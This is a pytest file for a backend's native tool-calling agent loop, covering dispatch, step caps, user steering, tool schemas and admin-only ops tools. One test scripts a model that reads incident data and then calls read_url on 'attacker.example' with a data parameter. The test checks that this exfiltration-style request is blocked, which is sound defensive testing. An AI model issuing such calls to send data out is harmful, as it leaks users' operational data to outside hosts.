import asyncio
import json
import time
from types import SimpleNamespace

import pytest
from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, ToolMessage

from backend.models import models as models_module
from backend.services import agent_workflow as aw
from backend.services import native_loop as nl
from backend.services import native_tools as nt
from backend.services import ops_incidents as ops
from backend.services import steering
from backend.utils import llm_usage as lu


def run(coro):
    return asyncio.run(coro)


def call(name, args=None, id=None):
    return {"name": name, "args": args or {}, "id": id or f"id_{name}", "type": "tool_call"}


def asks(*calls, text=""):
    return AIMessage(content=text, tool_calls=list(calls))


def answers(text):
    return AIMessage(content=text)


class ToolLLM:
    """A scripted tool-calling model: each response is an AIMessage (tool calls or text). It remembers what it was sent."""

    def __init__(self, *responses, on_call=None):
        self.responses = list(responses)
        self.calls = []
        self.on_call = on_call

    async def ainvoke_tools(self, messages, tools):
        self.calls.append((list(messages), list(tools)))
        if self.on_call:
            self.on_call(len(self.calls))
        if not tools:
            return self.responses[-1]       # asked for an answer with no tools: a real model can only reply in text
        return self.responses.pop(0) if len(self.responses) > 1 else self.responses[0]


TOOLS = [{"name": "search_code", "description": "find things"}, {"name": "read_repo_file", "description": "read a file"},
         {"name": "check_deploy_status", "description": "deploy"}]


class Acts:
    """A dispatcher that records what it was asked to run."""

    def __init__(self, results=None, delay=0, fail=()):
        self.results, self.delay, self.fail, self.decisions = results or {}, delay, set(fail), []

    async def __call__(self, decision):
        self.decisions.append(decision)
        if self.delay:
            await asyncio.sleep(self.delay)
        if decision["tool_action"] in self.fail:
            raise ValueError("boom")
        return self.results.get(decision["tool_action"], f"result of {decision['tool_action']}")


def go(llm, act=None, **kwargs):
    return run(nl.run(llm=llm, tools=kwargs.pop("tools", TOOLS), act=act or Acts(), question=kwargs.pop("question", "where is X?"), **kwargs))


# ---- the basic loop -------------------------------------------------------------------------------------------------------------------

def test_a_reply_with_no_tool_calls_is_the_answer_and_the_conversation_starts_with_the_fixed_prompt_then_the_request():
    llm = ToolLLM(answers("It lives in app.py."))
    result = go(llm, history="user: hi", time_line="Now: Sunday", coding_preferences="Prefers tests.")
    assert result == {"final_answer": "It lives in app.py.", "attempts": [], "show_work": False}
    messages, tools = llm.calls[0]
    assert isinstance(messages[0], SystemMessage) and messages[0].content == nl.SYSTEM_PROMPT and tools == TOOLS + [nl.SAVE_DRAFT_TOOL]
    context = messages[1].content
    assert isinstance(messages[1], HumanMessage) and context.index("Prefers tests.") < context.index("Now: Sunday") < context.index("RECENT CONVERSATION") < context.index("USER REQUEST:\nwhere is X?")


def test_a_tool_call_runs_through_the_dispatcher_and_its_result_goes_back_as_a_tool_message():
    llm = ToolLLM(asks(call("search_code", {"query": "foo"}, id="abc")), answers("Found it in a.py."))
    act = Acts({"search_code": "a.py:12"})
    result = go(llm, act)
    assert act.decisions == [{"tool_action": "search_code", "args": {"query": "foo"}, "purpose": "Run search_code"}]
    sent_second = llm.calls[1][0]
    assert isinstance(sent_second[-2], AIMessage) and sent_second[-2].tool_calls[0]["id"] == "abc"
    assert isinstance(sent_second[-1], ToolMessage) and sent_second[-1].tool_call_id == "abc" and sent_second[-1].name == "search_code" and sent_second[-1].content == "a.py:12"
    assert result["attempts"] == [{"purpose": "Run search_code", "action_desc": "search_code(query=foo)", "observation": "a.py:12"}]
    assert result["final_answer"] == "Found it in a.py." and result["show_work"] is False


def test_independent_calls_in_one_step_run_together_and_come_back_in_order():
    llm = ToolLLM(asks(call("search_code", {"query": "a"}), call("read_repo_file", {"path": "x"}), call("check_deploy_status")), answers("done"))
    act = Acts(delay=0.15)
    started = time.monotonic()
    result = go(llm, act)
    assert time.monotonic() - started < 0.4      # three 0.15s calls ran at once, not one after another
    assert [a["action_desc"].split("(")[0] for a in result["attempts"]] == ["search_code", "read_repo_file", "check_deploy_status"]
    tool_messages = [m for m in llm.calls[1][0] if isinstance(m, ToolMessage)]
    assert [m.name for m in tool_messages] == ["search_code", "read_repo_file", "check_deploy_status"]


def test_a_tool_the_model_was_not_offered_is_refused_without_running_it():
    llm = ToolLLM(asks(call("run_mongo_query", {"code": "x"})), answers("ok"))
    act = Acts()
    result = go(llm, act)
    assert act.decisions == [] and result["attempts"][0]["observation"].startswith("ERROR: 'run_mongo_query' is not an available tool")
    assert "check_deploy_status" in result["attempts"][0]["observation"] and result["show_work"] is True


def test_a_tool_that_raises_becomes_an_error_result_and_the_run_carries_on():
    llm = ToolLLM(asks(call("search_code", {"query": "a"})), answers("I couldn't search."))
    result = go(llm, Acts(fail=["search_code"]))
    assert result["attempts"][0]["observation"] == "ERROR: search_code failed (ValueError)." and result["final_answer"] == "I couldn't search." and result["show_work"] is True


def test_results_that_are_not_text_are_turned_into_text_and_long_ones_are_cut_for_the_model_but_kept_in_full_for_the_receipt():
    big = "x" * (nl.MAX_OBSERVATION_CHARS + 500)
    llm = ToolLLM(asks(call("search_code", {"query": "a"}), call("read_repo_file", {"path": "p"})), answers("ok"))
    result = go(llm, Acts({"search_code": [{"title": "t"}], "read_repo_file": big}))
    assert result["attempts"][0]["observation"] == '[{"title": "t"}]' and result["attempts"][1]["observation"] == big
    sent = [m for m in llm.calls[1][0] if isinstance(m, ToolMessage)]
    assert sent[0].content == '[{"title": "t"}]' and len(sent[1].content) < len(big) and "truncated: 500 more characters" in sent[1].content


# ---- it cannot run away -----------------------------------------------------------------------------------------------------------------

def test_at_the_step_cap_the_model_is_asked_for_an_answer_with_no_tools():
    llm = ToolLLM(*[asks(call("search_code", {"query": f"q{i}"})) for i in range(20)] + [answers("Here is what I found so far.")])
    result = go(llm, max_steps=3)
    assert len([c for c in llm.calls if c[1]]) == 3          # three steps with tools, then one without
    last_messages, last_tools = llm.calls[-1]
    assert last_tools == [] and last_messages[-1].content == nl.STEP_LIMIT_NOTICE
    assert result["final_answer"] == "Here is what I found so far." and result["show_work"] is True and len(result["attempts"]) == 3


def test_the_cap_cannot_be_raised_past_the_engines_own_maximum():
    llm = ToolLLM(*[asks(call("search_code", {"query": f"q{i}"})) for i in range(50)] + [answers("enough")])
    go(llm, max_steps=999)
    assert len([c for c in llm.calls if c[1]]) == nl.MAX_STEPS


def test_a_call_repeated_three_times_is_not_run_again_and_ends_the_loop_with_an_answer():
    llm = ToolLLM(*[asks(call("search_code", {"query": "same"})) for _ in range(10)] + [answers("I kept getting the same result.")])
    act = Acts()
    result = go(llm, act)
    assert len(act.decisions) == 1                           # run once; the repeats were answered without running
    assert any("you already made this exact call in step 1" in a["observation"] for a in result["attempts"])
    assert llm.calls[-1][1] == [] and result["final_answer"] == "I kept getting the same result."


def test_two_identical_calls_in_the_same_step_run_once():
    llm = ToolLLM(asks(call("search_code", {"query": "z"}, id="a"), call("search_code", {"query": "z"}, id="b")), answers("ok"))
    act = Acts()
    go(llm, act)
    assert len(act.decisions) == 1


def test_an_empty_final_reply_still_returns_something_honest():
    assert go(ToolLLM(answers("")))["final_answer"] == "I couldn't complete that request."


def test_a_reply_whose_content_is_a_list_of_parts_is_joined():
    reply = AIMessage(content=[{"type": "text", "text": "Hello "}, {"type": "text", "text": "there"}])
    assert go(ToolLLM(reply))["final_answer"] == "Hello there"


def test_progress_is_announced_for_each_call_that_actually_runs_and_a_failing_announcer_does_not_matter():
    seen = []

    async def emit(title, detail):
        seen.append((title, detail))
        raise RuntimeError("ui down")

    llm = ToolLLM(asks(call("search_code", {"query": "foo"})), asks(call("search_code", {"query": "foo"})), answers("ok"))
    result = run(nl.run(llm=llm, tools=TOOLS, act=Acts(), question="q", emit=emit))
    assert seen == [("Running search_code...", "search_code(query=foo)")] and result["final_answer"] == "ok"


# ---- switching it on ---------------------------------------------------------------------------------------------------------------------

def test_it_is_off_by_default_and_only_for_turns_the_old_engine_does_not_need(monkeypatch):
    monkeypatch.delenv("TOOL_AGENT_ENGINE", raising=False)
    assert not nl.enabled() and not nl.eligible(edit_turn=False, resumed=False, tools=TOOLS)
    monkeypatch.setenv("TOOL_AGENT_ENGINE", "Native")
    assert nl.enabled() and nl.eligible(edit_turn=False, resumed=False, tools=TOOLS)
    assert not nl.eligible(edit_turn=True, resumed=False, tools=TOOLS)      # an edit request against a connected folder
    assert not nl.eligible(edit_turn=False, resumed=True, tools=TOOLS)      # resuming a paused clarification or plan
    assert not nl.eligible(edit_turn=False, resumed=False, tools=[])        # nothing it can offer
    monkeypatch.setenv("TOOL_AGENT_ENGINE", "react")
    assert not nl.enabled()


# ---- mid-run steering (the same rules as the old loop) ---------------------------------------------------------------------------------------

class Steers:
    """A steering source that hands out queued messages the next time it is drained."""

    def __init__(self):
        self.queue, self.applied = [], []

    def push(self, *texts):
        self.queue.extend(texts)

    def __call__(self):
        out, self.queue = self.queue, []
        return out

    async def on_applied(self, messages, step):
        self.applied.append((list(messages), step))


def steering_messages(llm_call_index, llm):
    return [m for m in llm.calls[llm_call_index][0] if isinstance(m, HumanMessage) and m.content.startswith("USER STEERING")]


def test_with_no_steering_nothing_changes_and_a_blank_steer_is_ignored():
    llm = ToolLLM(answers("done"))
    steers = Steers()
    steers.push("   ", "")
    result = go(llm, steering_source=steers, on_steering_applied=steers.on_applied)
    assert result["final_answer"] == "done" and steers.applied == [] and steering_messages(0, llm) == []


def test_a_steer_that_is_waiting_when_a_step_starts_is_in_that_steps_conversation_and_widens_the_budget():
    steers = Steers()
    steers.push("also look at tests")
    llm = ToolLLM(asks(call("search_code", {"query": "a"})), answers("done"))
    result = go(llm, steering_source=steers, on_steering_applied=steers.on_applied)
    sent = steering_messages(0, llm)
    assert len(sent) == 1 and "1. also look at tests" in sent[0].content and nl.STEERING_NOTICE in sent[0].content
    assert steers.applied == [(["also look at tests"], 1)] and result["final_answer"] == "done"


def test_a_steer_that_arrives_while_the_model_is_deciding_discards_that_decision_and_decides_again():
    steers = Steers()
    act = Acts()
    # The first reply wants to run a tool; the steer lands during that call, so the tool must NOT run.
    llm = ToolLLM(asks(call("search_code", {"query": "old plan"})), asks(call("read_repo_file", {"path": "new"})), answers("done"),
                  on_call=lambda n: steers.push("forget that, read new") if n == 1 else None)
    result = go(llm, act, steering_source=steers, on_steering_applied=steers.on_applied)
    assert [d["tool_action"] for d in act.decisions] == ["read_repo_file"]            # the discarded plan never ran
    assert len(llm.calls) == 3 and len(steering_messages(1, llm)) == 1                # decided again, with the steer in view
    assert not any(isinstance(m, AIMessage) and m.tool_calls and m.tool_calls[0]["args"].get("query") == "old plan" for m in llm.calls[1][0])
    assert [a["action_desc"] for a in result["attempts"]] == ["read_repo_file(path=new)"] and steers.applied[0][0] == ["forget that, read new"]


def test_a_steer_that_arrives_during_a_final_answer_discards_it_too():
    steers = Steers()
    llm = ToolLLM(answers("old conclusion"), answers("new conclusion"), on_call=lambda n: steers.push("actually check B") if n == 1 else None)
    assert go(llm, steering_source=steers, on_steering_applied=steers.on_applied)["final_answer"] == "new conclusion"


def tool_steps(llm):
    return len([c for c in llm.calls if c[1]])


def test_each_waiting_steer_grants_two_extra_steps():
    steers = Steers()
    steers.push("one")
    llm = ToolLLM(*[asks(call("search_code", {"query": f"q{i}"})) for i in range(40)] + [answers("end")])
    go(llm, max_steps=1, steering_source=steers, on_steering_applied=steers.on_applied)
    assert tool_steps(llm) == 1 + 2


def test_the_extra_steps_a_run_can_be_granted_are_capped_at_eight_however_many_steers_arrive():
    steers = Steers()
    steers.push(*[f"s{i}" for i in range(6)])               # six at once would grant twelve
    llm = ToolLLM(*[asks(call("search_code", {"query": f"q{i}"})) for i in range(40)] + [answers("end")])
    go(llm, max_steps=1, steering_source=steers, on_steering_applied=steers.on_applied)
    assert tool_steps(llm) == 1 + 8


def test_steers_are_numbered_on_across_the_run_and_listed_with_the_standing_instruction():
    steers = Steers()
    steers.push("first")
    llm = ToolLLM(asks(call("search_code", {"query": "a"})), asks(call("search_code", {"query": "b"})), answers("end"),
                  on_call=lambda n: steers.push("second", "third") if n == 1 else None)
    go(llm, steering_source=steers, on_steering_applied=steers.on_applied)
    texts = [m.content for m in llm.calls[-1][0] if isinstance(m, HumanMessage) and m.content.startswith("USER STEERING")]
    assert len(texts) == 2 and texts[0].endswith("1. first") and texts[1].endswith("2. second\n3. third")
    assert all(nl.STEERING_NOTICE in text for text in texts) and [applied[0] for applied in steers.applied] == [["first"], ["second", "third"]]


def test_a_steer_widens_a_cap_that_would_otherwise_have_ended_the_run():
    steers = Steers()
    llm = ToolLLM(asks(call("search_code", {"query": "a"})), asks(call("search_code", {"query": "b"})), asks(call("search_code", {"query": "c"})),
                  answers("finished"), on_call=lambda n: steers.push("keep going") if n == 2 else None)
    result = go(llm, max_steps=2, steering_source=steers, on_steering_applied=steers.on_applied)
    assert result["final_answer"] == "finished" and result["show_work"] is False      # without the grant it would have been cut off at 2


def test_a_steer_waiting_at_the_cap_is_still_seen_by_the_final_answer():
    steers = Steers()
    llm = ToolLLM(asks(call("search_code", {"query": "a"})), answers("wrapped up"), on_call=lambda n: steers.push("stop") if n == 1 else None)
    # the steer lands during step 1's decision, discarding it; a cap of 1 + 2 granted lets the next decision through
    result = go(llm, max_steps=1, steering_source=steers, on_steering_applied=steers.on_applied)
    assert result["final_answer"] == "wrapped up" and any(m.content.startswith("USER STEERING") for m in llm.calls[-1][0] if isinstance(m, HumanMessage))


def test_a_failing_steering_callback_does_not_break_the_run():
    steers = Steers()
    steers.push("hello")

    async def broken(messages, step):
        raise RuntimeError("ui down")

    assert go(ToolLLM(answers("ok")), steering_source=steers, on_steering_applied=broken)["final_answer"] == "ok"


# ---- the tool declarations --------------------------------------------------------------------------------------------------------------------

MENU = [
    "- list_repo_tree — no args; lists every file path in the repo",
    "- read_repo_file — args: path (relative file path),   start_line (optional);\n   shows the file",
    "- check_deploy_status — no args; the latest Render deploy",
    "- list_app_incidents — args: since (optional), status (optional); lists incidents",
    "- propose_local_edits — args: summary, edits; changes files",          # the one write tool offered natively: it only proposes (the person applies from a diff)
    "- run_repo_tests — args: path; runs tests",                            # a write/run tool with no schema here: never offered natively
    "- browser_navigate — args: url",
    "- some_future_tool — args: x",
    "- read_repo_file — a duplicate line that must be ignored",
    "not a menu line at all",
]


def test_declarations_come_from_the_live_menu_for_tools_the_engine_can_handle_only():
    decls = nt.declarations_from_menu(MENU)
    assert [d["name"] for d in decls] == ["list_repo_tree", "read_repo_file", "check_deploy_status", "list_app_incidents", "propose_local_edits"]
    read = decls[1]
    assert read["description"] == "args: path (relative file path), start_line (optional); shows the file"          # whitespace collapsed
    assert read["parameters"]["required"] == ["path"] and set(read["parameters"]["properties"]) == {"path", "start_line", "line_count"}
    assert "parameters" not in decls[0] and "parameters" not in decls[2]                                          # no-argument tools have none


def test_what_the_menu_does_not_offer_is_not_declared_for_example_nothing_admin_only_for_someone_else():
    names = [d["name"] for d in nt.declarations_from_menu(["- search_code — args: query; finds things"])]
    assert names == ["search_code"]
    assert nt.declarations_from_menu([]) == []


def test_every_schema_is_well_formed_and_the_tools_with_arguments_name_them():
    for name, schema in nt.REGISTRY.items():
        assert schema["type"] == "object" and set(schema["required"]) <= set(schema["properties"]), name
        for prop in schema["properties"].values():
            assert prop["type"] in ("string", "integer", "array"), name
            if prop["type"] == "array":
                assert prop["items"]["type"] in ("string", "object"), name       # the API needs every array to say what is in it
    assert set(ops.OPS_ACTIONS) <= set(nt.REGISTRY)           # every admin ops tool can be offered natively


def test_the_declared_argument_names_are_the_ones_the_dispatcher_reads():
    import inspect

    dispatcher_source = inspect.getsource(aw.tool_agent_node)
    for name, schema in nt.REGISTRY.items():
        for arg in schema["properties"]:
            assert f'"{arg}"' in dispatcher_source or f"'{arg}'" in dispatcher_source or arg in dispatcher_source, (name, arg)


# ---- the model wrapper ------------------------------------------------------------------------------------------------------------------------

class Bound:
    def __init__(self, label, tools, response):
        self.label, self.tools, self.response = label, tools, response
        self.fallbacks = []

    def with_fallbacks(self, others):
        self.fallbacks = list(others)
        return self

    async def ainvoke(self, messages):
        return self.response


class Client:
    def __init__(self, label, response):
        self.label, self.response, self.bound = label, response, []

    def bind_tools(self, tools):
        runnable = Bound(self.label, tools, self.response)
        self.bound.append(runnable)
        return runnable


@pytest.fixture(autouse=True)
def _meter(monkeypatch):
    lu.reset()
    monkeypatch.setattr(lu, "flush_in_background", lambda: None)
    yield
    lu.reset()


def llm_with_clients(primary_response, fallback=True):
    llm = models_module.LazyLLM(model_name="primary-model", fallback_model="backup-model" if fallback else None)
    llm._real_llm = object()                      # marks it initialised
    llm._primary_client = Client("primary", primary_response)
    llm._fallback_client = Client("fallback", primary_response) if fallback else None
    return llm


def test_tools_are_bound_to_both_the_primary_and_the_fallback_and_cached_by_name():
    response = AIMessage(content="hi", usage_metadata={"input_tokens": 10, "output_tokens": 2, "total_tokens": 12}, response_metadata={"model_name": "primary-model"})
    llm = llm_with_clients(response)
    out = run(llm.ainvoke_tools([HumanMessage(content="x")], TOOLS))
    assert out is response
    primary_bound = llm._primary_client.bound[0]
    assert primary_bound.tools == TOOLS and len(primary_bound.fallbacks) == 1 and primary_bound.fallbacks[0].tools == TOOLS
    run(llm.ainvoke_tools([HumanMessage(content="y")], list(reversed(TOOLS))))
    assert len(llm._primary_client.bound) == 1                      # same tools in another order: reused, not bound again


def test_with_no_tools_it_is_just_the_model_and_a_step_is_metered_under_the_caller():
    response = AIMessage(content="final", usage_metadata={"input_tokens": 100, "output_tokens": 20, "total_tokens": 120, "input_token_details": {"cache_read": 60}})
    llm = llm_with_clients(response)
    llm._real_llm = SimpleNamespace(ainvoke=lambda messages: _async(response))

    async def a_step_taken_by_some_caller():
        return await llm.ainvoke_tools([HumanMessage(content="x")], [])

    assert run(a_step_taken_by_some_caller()) is response
    (day, model, label), counts = next(iter(lu.snapshot().items()))
    assert model == "primary-model" and label.endswith(".a_step_taken_by_some_caller")
    assert (counts["input"], counts["output"], counts["cached"]) == (100, 20, 60)


async def _async(value):
    return value


def test_a_transient_failure_returns_the_note_and_dev_mode_is_mocked():
    class Failing(Bound):
        async def ainvoke(self, messages):
            raise TimeoutError("slow")

    llm = llm_with_clients(AIMessage(content="x"), fallback=False)
    llm._primary_client.bind_tools = lambda tools: Failing("p", tools, None)
    assert "high traffic" in run(llm.ainvoke_tools([HumanMessage(content="x")], TOOLS)).content and lu.snapshot() == {}
    dev = models_module.LazyLLM()
    dev.dev_mode = True
    assert "DEV_MODE" in run(dev.ainvoke_tools([], TOOLS)).content


# ---- through tool_agent_node ----------------------------------------------------------------------------------------------------------------------

class FakeSDK:
    ErrAgentReadError = RuntimeError

    def __init__(self):
        self.calls = []

    async def list_incidents(self, **kw):
        self.calls.append("list")
        return [{"id": "inc_1", "service": "saapp", "environment": "production", "status": "open", "message": "KeyError: 'x'",
                 "created_at": "2026-10-10T08:00:00+00:00", "severity": None, "root_cause": None, "fix_status": None, "pr_url": None}]

    async def get_incident(self, incident_id):
        return {}

    async def list_logs(self, **kw):
        self.calls.append("logs")
        return {"entries": [], "matched": 0, "buffered": 0, "oldest_buffered": None}

    async def latest_deploy(self):
        self.calls.append("deploy")
        return {"status": "not_configured", "reason": "none"}


@pytest.fixture
def world(monkeypatch):
    monkeypatch.setenv("TOOL_AGENT_ENGINE", "native")
    monkeypatch.setenv("GITHUB_TOKEN", "fake-token")
    monkeypatch.setenv("ERRAGENT_URL", "https://erragent.example")
    monkeypatch.setenv("ERRAGENT_APP_ID", "saapp")
    monkeypatch.setenv("ERRAGENT_READ_SECRET", "ear_x")
    sdk = FakeSDK()
    monkeypatch.setattr(ops, "_sdk", lambda: sdk)
    monkeypatch.setattr(aw.requests, "get", lambda *a, **k: SimpleNamespace(status_code=200, json=lambda: {"default_branch": "main"}, text=""))
    monkeypatch.setattr(aw, "extract_github_repo", lambda text, fallback="SummonShenron/SAAPP": "SummonShenron/SAAPP")
    monkeypatch.setattr(aw, "get_db", lambda: SimpleNamespace(list_collection_names=lambda: ["incidents"]))
    fetched = []

    async def fake_read_url(*args, **kwargs):
        fetched.append(args[0])
        return "page"

    monkeypatch.setattr(aw, "read_url", fake_read_url)

    async def old_engine_must_not_run(**kwargs):
        raise AssertionError("the old ReAct loop ran")

    monkeypatch.setattr(aw, "run_react_loop", old_engine_must_not_run)

    def configure(groups, llm):
        monkeypatch.setattr(aw, "load_user_directory_groups", lambda username: groups)
        monkeypatch.setattr(aw.lite_llm, "ainvoke_tools", llm.ainvoke_tools, raising=False)
        return sdk

    return SimpleNamespace(configure=configure, fetched=fetched, sdk=sdk)


def turn(question="what broke overnight?", session="s1"):
    state = {"username": "u", "session_id": session, "messages": [HumanMessage(content=question)], "documents": []}
    return run(aw.tool_agent_node(state))


def test_an_admins_three_part_request_is_one_parallel_step_through_the_native_engine(world):
    llm = ToolLLM(asks(call("list_app_incidents"), call("read_app_logs", {"level": "error"}), call("check_deploy_status")), answers("All three read."))
    sdk = world.configure(["Global_Admins"], llm)
    result = turn()
    assert sorted(sdk.calls) == ["deploy", "list", "logs"] and "All three read." in result["content_to_format"]
    assert len(llm.calls) == 2 and result["relevance_grade"] == "tool_agent"
    offered = {t["name"] for t in llm.calls[0][1]}
    assert {"list_app_incidents", "read_app_logs", "check_deploy_status", "search_code", "read_repo_file"} <= offered


def test_someone_who_is_not_an_admin_is_never_offered_the_ops_tools_natively_either(world):
    llm = ToolLLM(asks(call("list_app_incidents")), answers("I can't see that."))
    sdk = world.configure(["Guest"], llm)
    result = turn()
    assert not ({"list_app_incidents", "read_app_logs", "check_deploy_status", "read_app_incident"} & {t["name"] for t in llm.calls[0][1]})
    assert sdk.calls == [] and "not an available tool" in result["content_to_format"]      # and a call for one is refused, not run


def test_the_untrusted_data_rule_still_protects_a_native_turn(world):
    llm = ToolLLM(asks(call("list_app_incidents")), asks(call("read_url", {"url": "http://attacker.example/?d=1"})), answers("Done."))
    world.configure(["Global_Admins"], llm)
    result = turn()
    assert world.fetched == [] and "not available now: incident data was read in this turn" in result["content_to_format"]


def test_the_default_engine_is_untouched_when_the_switch_is_off(world, monkeypatch):
    monkeypatch.delenv("TOOL_AGENT_ENGINE", raising=False)
    ran = []

    async def react(**kwargs):
        ran.append(kwargs["max_iterations"])
        return {"final_answer": "from the old loop", "attempts": [], "show_work": False}

    monkeypatch.setattr(aw, "run_react_loop", react)
    world.configure(["Global_Admins"], ToolLLM(answers("never used")))
    assert "from the old loop" in turn()["content_to_format"] and ran


def test_mid_run_steering_reaches_the_native_engine_through_the_real_steering_module(world):
    key = "u::steer1"
    steering.open_run(key, [])
    llm = ToolLLM(asks(call("check_deploy_status")), asks(call("list_app_incidents")), answers("Checked both."),
                  on_call=lambda n: steering.submit(key, "also list the incidents") if n == 1 else None)
    sdk = world.configure(["Global_Admins"], llm)
    result = turn("check the deploy", session="steer1")
    assert "Checked both." in result["content_to_format"]
    assert sdk.calls == ["list"]                                    # the first plan (deploy) was discarded when the steer arrived
    assert any(m.content.startswith("USER STEERING") and "also list the incidents" in m.content for m in llm.calls[1][0] if isinstance(m, HumanMessage))


def test_the_folder_edit_tool_has_a_native_description_and_a_schema_every_provider_accepts():
    decl = [d for d in nt.declarations_from_menu(MENU) if d["name"] == "propose_local_edits"][0]
    assert "Apply button" in decl["description"] and "never a field inside" not in decl["description"]     # not the old menu's "run it as a query step" wording
    schema = decl["parameters"]
    assert schema["required"] == ["summary", "edits"]

    def walk(node, path="schema"):
        if node.get("type") == "object":
            assert node.get("properties"), f"{path}: an object with no properties is rejected by the API"
            for key, child in node["properties"].items():
                walk(child, f"{path}.{key}")
        if node.get("type") == "array":
            assert "items" in node, f"{path}: an array must say what it holds"
            walk(node["items"], f"{path}[]")

    walk(schema)


# ---- a change request with a folder connected: the same "you must propose it" rule as the old loop ---------------------------------------

EDIT_TOOLS = TOOLS + [{"name": "propose_local_edits", "description": "make a change"}]
REQUIRED = {
    "tool_action": "propose_local_edits", "nudge_after_step": 3, "max_final_rejections": 2, "nudge": "NUDGE: propose it now.",
    "final_notice": "FINAL NOTICE: you can make it, call propose_local_edits.", "steps_notice": "Your next tool step must be propose_local_edits.",
}


def test_with_a_folder_connected_the_prompt_says_the_files_can_be_changed_and_no_draft_tool_competes_with_the_proposal():
    llm = ToolLLM(answers("done"))
    go(llm, tools=EDIT_TOOLS, environment_note="repo=x, LOCAL WORKSPACE: reads come from the folder")
    messages, tools = llm.calls[0]
    assert "CAN change the person's files" in messages[0].content and "save_draft" not in [t["name"] for t in tools]
    assert "WHERE YOU ARE READING FROM" in messages[1].content and "LOCAL WORKSPACE" in messages[1].content
    plain = ToolLLM(answers("done"))
    go(plain, tools=TOOLS, environment_note="ignored without the edit tool")
    assert "CAN change the person's files" not in plain.calls[0][0][0].content and "WHERE YOU ARE" not in plain.calls[0][0][1].content


def test_an_answer_without_a_proposal_on_a_change_request_is_sent_back_and_the_proposal_then_goes_through_the_shared_dispatcher():
    llm = ToolLLM(
        asks(call("read_repo_file", {"path": "local/src/index.css"}, id="r1")),
        answers("Here is the CSS to paste."),                                                   # not allowed on a change request
        asks(call("propose_local_edits", {"summary": "lighter", "edits": [{"path": "local/src/index.css", "old_string": "a", "new_string": "b"}]}, id="p1")),
        answers("I proposed it; press Apply."),
    )
    act = Acts({"propose_local_edits": "Proposed 1 edit(s) across 1 file(s)"})
    result = go(llm, act, tools=EDIT_TOOLS, required_action=REQUIRED)
    assert [d["tool_action"] for d in act.decisions] == ["read_repo_file", "propose_local_edits"]
    sent_after_rejection = [str(m.content) for m in llm.calls[2][0]]
    assert any("FINAL NOTICE" in text for text in sent_after_rejection) and any("Here is the CSS to paste." in text for text in sent_after_rejection)
    assert result["final_answer"] == "I proposed it; press Apply."


def test_the_rejection_is_limited_so_a_turn_that_cannot_propose_still_answers():
    llm = ToolLLM(asks(call("read_repo_file", {"path": "a.css"}, id="r1")), answers("no luck"))
    act = Acts()
    result = go(llm, act, tools=EDIT_TOOLS, required_action=REQUIRED)
    assert result["final_answer"] == "no luck"
    assert sum("FINAL NOTICE" in str(m.content) for m in llm.calls[-1][0]) == 2          # sent back twice, then accepted


def test_a_proposal_that_came_back_as_an_error_does_not_count_as_made():
    llm = ToolLLM(
        asks(call("propose_local_edits", {"summary": "x", "edits": []}, id="p1")),
        answers("Sorry, could not."),
        asks(call("propose_local_edits", {"summary": "x", "edits": [{"path": "a", "old_string": "1", "new_string": "2"}]}, id="p2")),
        answers("Proposed."),
    )
    act = Acts({"propose_local_edits": "ERROR: these edits could not be applied cleanly"})
    result = go(llm, act, tools=EDIT_TOOLS, required_action=REQUIRED)
    assert len(act.decisions) == 2 and result["final_answer"] == "Proposed."


def test_the_steps_notice_on_a_change_request_asks_for_the_proposal_not_for_the_code_in_full():
    reads = [asks(call("read_repo_file", {"path": f"{n}.css"}, id=f"r{n}")) for n in range(6)]
    llm = ToolLLM(*reads, answers("done"))
    go(llm, tools=EDIT_TOOLS, required_action=REQUIRED, max_steps=4)
    notices = [str(m.content) for messages, _ in llm.calls for m in messages if str(m.content).startswith("STEPS:")]
    assert notices and all("Your next tool step must be propose_local_edits" in text for text in notices)
    assert not any("the code itself, in full" in text for text in notices)


def test_the_engine_choice_keeps_a_change_request_native_when_the_tool_is_offered():
    source = open("backend/services/agent_workflow.py", encoding="utf-8").read()
    assert 'edit_turn=edit_turn and not any(tool.get("name") == "propose_local_edits" for tool in native_tools)' in source
    assert 'required_action=kwargs.get("required_action")' in source


def test_a_draft_and_confirm_tool_stops_the_loop_for_the_caller_instead_of_running(monkeypatch):
    """propose_append_target_doc writes nothing: the turn raises the same signal the old loop does, and the dispatcher is never asked to run it."""
    from backend.utils.agent_utils import _UnsafeActionRequested

    acts = Acts()
    llm = ToolLLM(asks(call("propose_append_target_doc", {"content": "Week of Oct 19: shipped X."})), answers("unused"))
    tools = [{"name": "search_code", "description": "find things"}, {"name": "propose_append_target_doc", "description": "append"}]
    with pytest.raises(_UnsafeActionRequested) as raised:
        run(nl.run(llm=llm, tools=tools, act=acts, question="add this to my weekly reports", is_unsafe=lambda d: d["tool_action"] == "propose_append_target_doc"))
    assert raised.value.decision["tool_action"] == "propose_append_target_doc"
    assert raised.value.decision["args"] == {"content": "Week of Oct 19: shipped X."}
    assert acts.decisions == []


def test_the_target_doc_tool_has_a_native_schema_and_the_engine_hands_over_is_unsafe():
    declared = nt.declarations_from_menu(["- propose_append_target_doc — args: content (the text)"])
    assert [d["name"] for d in declared] == ["propose_append_target_doc"]
    assert declared[0]["parameters"]["required"] == ["content"]
    source = open(aw.__file__, encoding="utf-8").read()
    assert 'is_unsafe=kwargs.get("is_unsafe")' in source
